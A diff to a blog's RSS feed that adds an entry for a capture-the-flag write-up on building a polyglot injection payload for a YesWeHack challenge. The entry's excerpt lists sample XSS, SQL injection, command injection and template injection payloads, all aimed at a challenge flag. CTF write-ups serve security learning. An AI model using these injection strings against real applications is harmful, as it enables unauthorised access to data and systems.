@@ -14,6 +14,17 @@ spot</description>
     
     
     <item>
+      <title>One payload to pwn them all - YesWeHack challenge - June 2022</title>
+      <link>https://erk3.github.io/writeups/yeswehack-lehack2022/</link>
+      <pubDate>Wed, 29 Jun 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://erk3.github.io/writeups/yeswehack-lehack2022/</guid>
+      <description>/ The challenge We were presented with the task to build a polyglot payload that could solve simultaneously no less than 12 simple injections inside various code snippets (Javascript, SQL, Shell, Jinja, Vue, Freemarker and Brainfuck).
+  / The building Taken individually, each injection is a really simple challenge for which this writeup won&amp;rsquo;t go into details.
+   Snippet Payload     XSS-1 &amp;quot;;alert(FLAG)//   XSS-2 alert(FLAG)   XSS-3 &amp;lt;script&amp;gt;alert(FLAG)&amp;lt;/script&amp;gt;   XSS-4 &amp;quot; tabindex=1 autofocus onfocus=&amp;quot;alert(FLAG)&amp;quot;   Sqli-1 &#39; UNION SELECT flag FROM flag --   Sqli-2 1 UNION SELECT flag from flag --   CMD-1 ;echo $FLAG   CMD-2 EOFecho $FLAG   JINJA-1 {{cycler.</description>
+    </item>
+    
+    <item>
       <title>About</title>
       <link>https://erk3.github.io/about/</link>
       <pubDate>Tue, 31 May 2022 00:00:00 +0000</pubDate>
